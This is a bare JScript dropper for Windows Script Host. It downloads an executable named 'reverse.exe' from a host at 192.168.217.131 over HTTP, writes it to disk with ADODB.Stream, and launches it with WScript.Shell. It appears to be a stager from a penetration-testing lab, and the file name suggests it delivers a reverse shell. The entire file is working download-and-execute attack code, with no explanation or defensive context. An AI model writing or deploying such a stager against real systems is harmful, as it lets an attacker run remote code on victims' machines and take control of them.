var url = "http://192.168.217.131:8081/reverse.exe"
var Object = WScript.CreateObject('MSXML2.XMLHTTP');

Object.Open('GET', url, false);
Object.Send();

if (Object.Status == 200)
{
    var Stream = WScript.CreateObject('ADODB.Stream');
    
    Stream.Open();
    Stream.Type = 1;
    Stream.Write(Object.ResponseBody);
    Stream.Position = 0;
    Stream.SaveToFile("reverse.exe", 2);
    Stream.Close();
}

var r = new ActiveXObject("WScript.Shell").Run("reverse.exe");